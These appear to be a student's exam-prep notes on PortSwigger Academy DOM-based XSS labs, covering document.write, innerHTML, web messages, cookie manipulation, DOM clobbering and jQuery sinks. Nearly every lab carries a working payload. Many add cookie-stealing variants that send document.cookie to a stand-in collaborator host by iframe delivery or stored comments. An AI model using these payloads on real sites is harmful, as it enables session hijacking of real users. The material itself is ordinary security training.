### What is it?
DOM-based XSS vulnerabilities arise when JavaScript takes data from an attacker-controllable source, such as the URL, and passes code to a sink that supports dynamic code execution. Test which characters enable the escaping out of the `source code` injection point, by using the fuzzer string: `<>\'\"<script>{{7*7}}$(alert(1)}"-prompt(69)-"fuzzer`

Review the `source code` to _**identify**_ the **sources** , **sinks** or **methods** that may lead to exploit, list of samples:
- document.write()
- window.location
- document.cookie
- eval()
- document.domain
- WebSocket()
- element.src
- postMessage()
- setRequestHeader()
- FileReader.readAsText()
- ExecuteSql()
- sessionStorage.setItem()
- document.evaluate()
- JSON.parse
- ng-app
- URLSearchParams
- replace()
- innerHTML
- location.search
- addEventListener
- sanitizeKey()

>[!tip] IMPORTANT BURP SETTING
>Uncheck the Hide box in Filter settings because we want to see `js` files in HTTP History.

### DOM Invader
Using Dom Invader plug-in and set the canary to value, such as `domxss`, it will detect DOM-XSS sinks that can be exploit.
![602](DOM-Based%20XSS-20260106205003601.png)


- - - 
#### 1.x. Lab: DOM XSS in `document.write` sink using source `location.search` ⭕️
This lab contains a DOM-based cross-site scripting vulnerability in the search query tracking functionality. It uses the JavaScript `document.write` function, which writes data out to the page. The `document.write` function is called with data from `location.search`, which you can control using the website URL.
To solve this lab, perform a cross-site scripting attack that calls the `alert` function. ^5qx1ru
1. Click on DOM Invader > Update canary > right click > Inspect > DOM Invader > Inject forms > click Search on the search bar. Notice DOM Invader found a vulnerable sink.
	1. ![766](DOM-Based%20XSS%20%E2%9C%85-20260126205248179.png)
2. Click Exploit and DOM Invader will throw a payload in the URL and the lab is solved.
	1. ![DOM-Based XSS ✅-20260126205323135](DOM-Based%20XSS%20%E2%9C%85-20260126205323135.png)

>[!tip] How to Identify this Vulnerability
>1. Search bar

---
#### 1.4. Lab: DOM XSS in `innerHTML` sink using source `location.search` ⭕️
This lab contains a DOM-based cross-site scripting vulnerability in the search blog functionality. It uses an `innerHTML` assignment, which changes the HTML contents of a `div` element, using data from `location.search`.
To solve this lab, perform a cross-site scripting attack that calls the `alert` function.
1. Use the search feature like `test123` and notice the response has `innerHTML`
	1. ![300](DOM-Based%20XSS%20%E2%9C%85-20260126210056541.png)
2. Just use DOM Invader to solve.
>[!tip] How to Identify this Vulnerability
>1. Search bar
>2. has `innerHTML` in the `GET /?search={input}` request

---
#### 1.5. Lab: DOM XSS in jQuery anchor `href` attribute sink using `location.search` source ⭕️
This lab contains a DOM-based cross-site scripting vulnerability in the submit feedback page. It uses the jQuery library's `$` selector function to find an anchor element, and changes its `href` attribute using data from `location.search`.
To solve this lab, make the "back" link alert `document.cookie`.
1. Submit feedback > notice the URL has a `returnPath` query parameter. Add something like `abc12` > enter > Inspect > notice that `abc12` is inside an `href` attribute for the Back button.
	1. ![DOM-Based XSS ✅-20260126211349171](DOM-Based%20XSS%20%E2%9C%85-20260126211349171.png)
	2. ![DOM-Based XSS ✅-20260126211359224](DOM-Based%20XSS%20%E2%9C%85-20260126211359224.png)
2. Set the payload `/feedback?returnPath=javascript:alert(document.cookie)` > Enter > click Back and solved. 
	1. ![DOM-Based XSS ✅-20260126211704778](DOM-Based%20XSS%20%E2%9C%85-20260126211704778.png)

>[!tip] How to Identify this Vulnerability
>1. Submit feedback
>2. jQuery v1.8.2
>3. `returnPath` query parameter

---
#### 1.x. Lab: DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded ⭕️
This lab contains a DOM-based cross-site scripting vulnerability in a AngularJS expression within the search functionality.
AngularJS is a popular JavaScript library, which scans the contents of HTML nodes containing the `ng-app` attribute (also known as an AngularJS directive). When a directive is added to the HTML code, you can execute JavaScript expressions within double curly braces. This technique is useful when angle brackets are being encoded.
To solve this lab, perform a cross-site scripting attack that executes an AngularJS expression and calls the `alert` function.

1. Look in the page source/http response and if `ng-app` and (maybe) `angular 1.7.7` exists, then this is vulnerable.
	1. ![DOM-Based XSS-20260106205424744](DOM-Based%20XSS-20260106205424744.png)
2. Enter the payload in the search bar will solve the lab
	1. ![DOM-Based XSS-20260106205528746](DOM-Based%20XSS-20260106205528746.png)

#ExamTip Use this payload to grab the session cookie. But this is only YOUR cookie, not the victim's. To grab the victim's cookie, place the payload in an iframe then deliver it to the victim -
`{{$on.constructor('document.location="https://OASTIFY.COM?c="+document.cookie')()}}`
![DOM-Based XSS-20260106205758190](DOM-Based%20XSS-20260106205758190.png)
- - -
#### 1.x. Lab: DOM XSS in `document.write` sink using source `location.search` inside a select element ⭕️
This lab contains a DOM-based cross-site scripting vulnerability in the stock checker functionality. It uses the JavaScript `document.write` function, which writes data out to the page. The `document.write` function is called with data from `location.search` which you can control using the website URL. The data is enclosed within a select element.

To solve this lab, perform a cross-site scripting attack that breaks out of the select element and calls the `alert` function.
##### Manual Method
1. Click on a product and look in the page source. The `document.write` function takes in the `storeId` value which we can select due to it being a dropdown list. We can leverage that to break out of the dropdown list and get XSS.
	1. ![DOM-Based XSS-20260106211433624](DOM-Based%20XSS-20260106211433624.png)
2. Entered the following in the URL and see that `FUZZ` is in the dropdown list and `outside_dropdown` is outside it and so now we can enter our XSS payload.
	1. ![DOM-Based XSS-20260106211854125](DOM-Based%20XSS-20260106211854125.png)
3. The following payload breaks out of the dropdown list and the XSS executes: `/product?productId=1&storeId="></select><img%20src=1%20onerror=alert(1)>`
	1. ![DOM-Based XSS-20260106212037754](DOM-Based%20XSS-20260106212037754.png)

#ExamTip Host this payload in an iframe and deliver to victim to grab their session cookie
```
"></select><script>document.location='https://OASTIFY.COM/?domxss='+document.cookie</script>//
```

**Deliver this exploit to victim**
```
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/product?productId=2&storeId="></select><script>document.location%3d'https%3a//OASTIFY.COM/%3fdomxss%3d'%2bdocument.cookie</script>//"></iframe>
```


- - -
#### 1.3. Lab: DOM XSS using web messages and `JSON.parse` ⭕️
This lab uses web messaging and parses the message as JSON. To solve the lab, construct an HTML page on the exploit server that exploits this vulnerability and calls the `print()` function.

1. View the page source of the `/` endpoint and notice JS code has`JSON.parse()`. The payload to solve the lab targets `load-channel` it to work. The `addEventListener('message'...`  indicates it's using **web messages** so we can use DOM Invader to identify and exploit this.
	1. ![DOM-Based XSS-20260107094710930](DOM-Based%20XSS-20260107094710930.png)
2. This is the payload:
```
<iframe src=https://YOUR-LAB-ID.web-security-academy.net/ onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>
```

#ExamTip Github has this payload to grab the victim's cookie but testing in the lab, it wouldn't get the cookie. The lab doesn't have a user clicking on something so we won't get anything from Collaborator but we can simulate it by clicking `View exploit` so we should get our own cookie. Still no dice. **BUT using DOM Invader got the cookie!**
```
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/"
        onload='this.contentWindow.postMessage(
          JSON.stringify({
            type: "load-channel",
            url: "javascript:fetch(`https://YOUR-BURP-COLLAB-OASTIFY.COM/?c=`+encodeURIComponent(document.cookie))"
          }), "*")'>
</iframe>
```
![DOM-Based XSS-20260107100527561](DOM-Based%20XSS-20260107100527561.png)
![DOM-Based XSS-20260107100541502](DOM-Based%20XSS-20260107100541502.png)
>[!tip] Important Note on CORS Policy
>If the `Access-Control-Allow-Origin` header is set to the lab id or anything that's not `*` then 
>we *won't* be able to fetch the cookie. It blocks it. If the header is absent then it should work.

##### Using DOM Invader to get session cookie
1. Use Burp's browser
2. Click on the burp logo > DOM Invader > turn on Postmessage interception is on > Reload
	1. ![335](DOM-Based%20XSS-20260107101432404.png)
3. Right click > Inspect > DOM Invader > Messages > click on the first one
	1. ![DOM-Based XSS-20260107101558226](DOM-Based%20XSS-20260107101558226.png)
4. Enter the following payload (replace your collab url) > Send
```
{
    "type": "load-channel",
    "url": "JavaScript:document.location='https://OASTIFY.COM?c='+document.cookie"
}
```
![DOM-Based XSS-20260107101530626](DOM-Based%20XSS-20260107101530626.png)
Poll collaborator and got *our own* cookie
![DOM-Based XSS-20260107101709939](DOM-Based%20XSS-20260107101709939.png)

**Deliver this exploit to victim**
```
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/"
        onload='this.contentWindow.postMessage(
          JSON.stringify({
            type: "load-channel",
            url: "javascript:fetch('https%3a//OASTIFY.COM/%3fc%3d'%2bencodeURIComponent(document.cookie))"
          }), "*")'>
</iframe>
```

```
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/" onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:fetch('https%3a//OASTIFY.COM/%3fc%3d'%2bdocument.cookie)\"}","*")'>

```
- - -

#### 1.2. Lab: DOM XSS using web messages and a JavaScript URL ⭕️
This lab demonstrates a DOM-based redirection vulnerability that is triggered by web messaging. To solve this lab, construct an HTML page on the exploit server that exploits this vulnerability and calls the `print()` function.

1. View the page source and notice an `indexOf()` function with https and http and `addEventListener()` which listens for a web message.
	1. This only checks *if the message contains https: or http: and will redirect the user to an URL in the web message*
	2. ![DOM-Based XSS-20260107103326133](DOM-Based%20XSS-20260107103326133.png)
2. The following payload solved the lab: 
3. ```
   <iframe src="https://YOUR-LAB-ID.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print()//http:','*')">
   ```

> Follow the DOM Invader steps in Lab 3, we can also get the session cookie *our own, not the victim's*. Maybe it has something to do with the lack of the `fetch()` function...

**Deliver this exploit to victim**
```
# Works (KEEP THE BACKTICK + DO NOT URL ENCODE)
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:document.location=`https://oastify.com?c=`+document.cookie//http:','*')">
```

- - - 

#### 1.1. Lab: DOM XSS using web messages ⭕️
This lab demonstrates a simple web message vulnerability. To solve this lab, use the exploit server to post a message to the target site that causes the `print()` function to be called.

1. Check the page source for `addEventListener()` indicates it listens for web messages and `getElementById()` function.
	1. ![DOM-Based XSS-20260107104820418](DOM-Based%20XSS-20260107104820418.png)
2. This payload solves the lab
```
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">
```
3. This payload gets the victim's session cookie

```
<iframe src="https://TARGET.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=fetch(`https://OASTIFY.COM?collector=`+btoa(document.cookie))>','*')">
```
1. Using this payload, Store > View exploit doesn't even get our own cookie
	1. ![DOM-Based XSS-20260107105330760](DOM-Based%20XSS-20260107105330760.png)

>The `fetch` function enclose the collaborator target inside **back ticks**, and when the iframe loads on the victim browser, the `postMessage()` method sends a web message to their home page.
>Replacing the Burp Lab payload `print()` with `fetch()` in the above code allow attacker to steal the victim session cookie.

**Deliver this exploit to victim** then base64 decode because of `btoa`
```
<iframe src="https://TARGET.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=fetch(`https://OASTIFY.COM?collector=`+btoa(document.cookie))>','*')">
```
- - -

#### 1.x. Lab: Reflected DOM XSS ⭕️
This lab demonstrates a reflected DOM vulnerability. Reflected DOM vulnerabilities occur when the server-side application processes data from a request and echoes the data in the response. A script on the page then processes the reflected data in an unsafe way, ultimately writing it to a dangerous sink.
To solve this lab, create an injection that calls the `alert()` function.

1. In Filter settings, make sure to uncheck Hide extensions like `js`.
2. #ExamTip Using DOM Invader > Inject forms > Search will show us the vulnerable JS function: `eval()`
	1. ![DOM-Based XSS-20260107112437783](DOM-Based%20XSS-20260107112437783.png)
3. Then click on the Stack Trace link > click on the `js` file > then we will see where the vulnerable function is.
	1. ![DOM-Based XSS-20260107112545437](DOM-Based%20XSS-20260107112545437.png)
	2. ![DOM-Based XSS-20260107112558920](DOM-Based%20XSS-20260107112558920.png)
4. Entering `/` as the search term
	1. ![DOM-Based XSS-20260107112751088](DOM-Based%20XSS-20260107112751088.png)
5. Entering `/"` 
	1. ![DOM-Based XSS-20260107112815790](DOM-Based%20XSS-20260107112815790.png)
6. Entering `aaabbb` and we can see that the closing brace is a different color (the intended color) but entering `/` terms it green (breaking out of it).
	1. ![DOM-Based XSS-20260107112941676](DOM-Based%20XSS-20260107112941676.png)
>As you have injected a backslash and the site isn't escaping them, when the JSON response attempts to escape the opening double-quotes character, it adds a second backslash. The resulting double-backslash causes the escaping to be effectively canceled out. This means that the double-quotes are processed unescaped, which closes the string that should contain the search term.
>The backslash `\` is not sanitized, and the JSON data is then send to `eval()`. Backslash is not escaped correctly and when the JSON response attempts to escape the opening double-quotes character, it adds a **second** backslash. The resulting double-backslash causes the escaping to be effectively **cancelled out**.

This payload solved the lab: `\"-alert(1)}//`.
![DOM-Based XSS-20260107113215874](DOM-Based%20XSS-20260107113215874.png)

#ExamTip Use this payload, deliver to victim to get their session cookie:
**Deliver this exploit to victim**
```
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search=%5C%22-fetch%28%27https%3A%2F%2FOASTIFY.COM%3Freflects%3D%27%2Bdocument.cookie%29%7D%2F%2F"></iframe>
```
- - -

#### 1.5. Lab: DOM-based cookie manipulation ⭕️
This lab demonstrates DOM-based client-side cookie manipulation. To solve this lab, inject a cookie that will cause XSS on a different page and call the `print()` function. You will need to use the exploit server to direct the victim to the correct pages.

1. Click on a product and notice the page source's JS which contains a client-site cookie `lastViewedProduct` and `window.location` tells us that the cookie value is the URL of the last product URL the user visited.
	1. ![DOM-Based XSS-20260107133547474](DOM-Based%20XSS-20260107133547474.png)
2. We can break out of it by supplying `&'>` then proceed to enter our XSS payload, wrap it in an iframe and deliver it to the victim. The following payload solved the lab.
```
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/product?productId=1&'><script>print()</script>" onload="if(!window.x)this.src='https://YOUR-LAB-ID.web-security-academy.net';window.x=1;">
```

#ExamTip This payload that is wrapped in an iframe can steal the victim's cookie once delivered.
```
# Send to exploit server + check access log
<iframe src="https://TARGET.net/product?productId=1&'><script>fetch('https://EXPLOIT.net/log?c='%2bdocument.cookie)</script>" onload="if(!window.x)this.src='https://TARGET.net';window.x=1;">
</iframe>

# Send to burp collaborator
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/product?productId=1&'><script>fetch('https://OASTIFY.COM/log?c='%2bdocument.cookie)</script>" onload="if(!window.x)this.src='https://YOUR-LAB-ID.web-security-academy.net';window.x=1;">
</iframe>
```
- - - 

#### 1.4. Lab: DOM-based open redirection ⭕️
This lab contains a DOM-based open-redirection vulnerability. To solve this lab, exploit this vulnerability and redirect the victim to the exploit server.

1. Click on a blog post > right click > Inspect > notice an `<a>` tag with an `url` parameter that you can insert any URL.
	1. ![DOM-Based XSS-20260119200140617](DOM-Based%20XSS-20260119200140617.png)
	2. `<a href="#" onclick="returnUrl = /url=(https?:\/\/.+)/.exec(location); location.href = returnUrl ? returnUrl[1] : &quot;/&quot;">Back to Blog</a>`
2. Put the following payload in the URL to solve.
```
`https://YOUR-LAB-ID.web-security-academy.net/post?postId=4&url=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/`
```
```
https://0a2f00b603acd050810ded1100ef00ea.web-security-academy.net/post?postId=4&url=https://exploit-0ae50046035bd063811cecae01000032.exploit-server.net/
```
>[!tip] How to Identify this Vulnerability?
>1. `url` param in page source sets to any URL you insert

**No way to apply this to Stage 1**

---

#### 1.x. Lab: Exploiting DOM clobbering to enable XSS ⭕️
This lab contains a DOM-clobbering vulnerability. The comment functionality allows "safe" HTML. To solve this lab, construct an HTML injection that clobbers a variable and uses XSS to call the `alert()` function.

1. Enter the following payload in a post comment: `<a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//">`
2. Return to the blog and post an arbitrary comment then upon returning to the blog, the payload will execute.
	1. ![334](XSS-20260106202500560.png)

#ExamTip Use this payload to grab the victim's cookie via Burp Collaborator. Same as the lab where you post this payload, post an arbitrary comment, then the next time someone visits the blog the payload will execute.
```
<a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=document.location=`https://eq8f7s7sr1rp3btsd0ddh7u10s6nudi2.oastify.com/?clobber=`+document.cookie//">
```
![XSS-20260106203009278](XSS-20260106203009278.png)

**Note from Github guide: This is a Stored self-XSS**
>Blog comment with **Stored self-XSS**, upgrading the payload to steal victim information from DOM. The function **edit content** reflect the input in the `<script>` tag. The CSRF token for the **write comment** is same as the **edit content** functions. Below payload use **write comment** function to make the victim create a blog entry on their on blog with our malicious content. The `a` character is added to escape the `#` hash character from the initial application `source code`. The below `source code` in the blog entry is full exploit to steal victim info.
```
<button form=comment-form formaction="/edit" id=share-button>Click Button</button>
<input form=comment-form name=content value='<meta http-equiv="refresh" content="1; URL=/edit" />'>
<input form=comment-form name=tags value='a");alert(document.getElementsByClassName("navbar-brand")[0].innerText)//'>
```


**Store this payload on in a comment**
```
<a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=document.location=`https://OASTIFY.COM/?clobber=`+document.cookie//">
```

- - - 

#### 1.x. Lab: Stored DOM XSS ⭕️
This lab demonstrates a stored DOM vulnerability in the blog comment functionality. To solve this lab, exploit this vulnerability to call the `alert()` function.

1. In Filter settings, make sure to uncheck the box that hides `js` files
	1. ![XSS-20260106203944889](XSS-20260106203944889.png)
2. There's a `js` file that show a function, `html.replace`, in the `loadComments` function. 
	1. ![XSS-20260106204131102](XSS-20260106204131102.png)
3. The payload `<script>alert(1)</script>` was entered and only `<script>alert(1)` was shown. The `html.replace` function is responsible.
	1. ![XSS-20260106204340510](XSS-20260106204340510.png)
4. Enter the following payload and solved `<><img src=1 onerror=alert(1)>`.

#ExamTip Use this payload to grab the victim's session cookie:
**Store this exploit in a comment**
```
<><img src=1 onerror=javascript:fetch(`https://OASTIFY.COM?escape=`+document.cookie)>
```

---

#### 1.x. Lab: DOM XSS in jQuery selector sink using a hashchange event ⭕️
This lab contains a DOM-based cross-site scripting vulnerability on the home page. It uses jQuery's `$()` selector function to auto-scroll to a given post, whose title is passed via the `location.hash` property.
To solve the lab, deliver an exploit to the victim that calls the `print()` function in their browser.

1. Right click > Inspect > Sources > refresh page > CMD+F > `<script` find the `hashchange` function.
	1. When you paste in the blog header with `#` in the URL, it will take you there.
		1. ![XSS-20260105214838774](XSS-20260105214838774.png)
		2. ![354](XSS-20260105215026742.png)
2. Using the Console and running the commands in the screenshot will show what the code is doing.
	1. ![XSS-20260105215256108](XSS-20260105215256108.png)
	2. 1. Show the header without the `#` and 2. decodes all the URL encoding.
3. Look up JQuery 1.8.2 and note that the `hashchange` function is vulnerable.
4. Go to exploit server, store and deliver the following payload to victim to solve: 
```
<iframe src="https://0a3d005f0434062182dd4268004600c2.web-security-academy.net//#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
```

#ExamTip Use this to grab the victim's session cookie via Burp Collaborator:
**Deliver this exploit to victim**
```
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/#" onload="document.location='https://OASTIFY.COM/?cookies='+document.cookie"></iframe>
```

- - -
